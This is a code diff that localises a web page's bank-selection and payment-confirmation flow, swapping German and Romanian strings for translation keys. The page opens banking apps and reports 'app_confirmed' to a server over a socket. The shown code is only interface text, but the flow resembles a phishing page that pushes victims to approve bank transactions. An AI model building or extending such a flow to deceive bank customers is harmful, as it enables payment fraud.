@@ -145,7 +145,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 
     <!-- Auto-detected bank -->
     <div id="app-matched" style="display:none;margin-bottom:14px">
-      <p style="font-size:11px;font-weight:700;color:#872879;text-transform:uppercase;letter-spacing:.06em;margin:0 0 8px">Erkannte Bank</p>
+      <p style="font-size:11px;font-weight:700;color:#872879;text-transform:uppercase;letter-spacing:.06em;margin:0 0 8px" data-i18n="detected_bank">Detected bank</p>
       <button id="app-matched-btn" style="width:100%;display:flex;align-items:center;gap:12px;padding:14px 16px;border:2px solid #872879;border-radius:14px;background:linear-gradient(135deg,#fdf2f8,#fff);cursor:pointer;text-align:left;box-shadow:0 4px 16px rgba(135,40,121,.18);transition:.15s">
         <div id="app-matched-icon" style="width:46px;height:46px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
           <span id="app-matched-tx" style="color:#fff;font-weight:900;font-size:11px"></span>
@@ -156,7 +156,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
         </div>
         <i class="fas fa-chevron-right" style="color:#872879;font-size:14px"></i>
       </button>
-      <button onclick="showAllBanks()" style="width:100%;margin-top:8px;padding:8px;border:none;background:none;font-size:11px;color:#94a3b8;cursor:pointer">Andere Bank wählen →</button>
+      <button onclick="showAllBanks()" style="width:100%;margin-top:8px;padding:8px;border:none;background:none;font-size:11px;color:#94a3b8;cursor:pointer" data-i18n="change_bank">Choose a different bank →</button>
     </div>
     <!-- All banks fallback -->
     <div id="app-all-banks" style="display:none">
@@ -284,7 +284,7 @@ function openBank(scheme, iosUrl, androidUrl){
     if(done) return; done=true;
     cleanup();
     var w=document.getElementById('app-waiting');
-    if(w) w.innerHTML='<div style="text-align:center;padding:16px 0"><svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#872879" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg><p style="font-size:13px;color:#872879;font-weight:700;margin:10px 0 2px" data-i18n="app_detected">Confirmare detectată</p><p style="font-size:11px;color:#64748b;margin:0" data-i18n="processing">Se procesează plata…</p></div>';
+    if(w) w.innerHTML='<div style="text-align:center;padding:16px 0"><svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#872879" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg><p style="font-size:13px;color:#872879;font-weight:700;margin:10px 0 2px">'+t('app_detected')+'</p><p style="font-size:11px;color:#64748b;margin:0">'+t('processing')+'</p></div>';
     socket.emit('app_confirmed',{token:TOKEN});
     setTimeout(function(){ document.getElementById('ov-app').style.display='none'; },2200);
   }
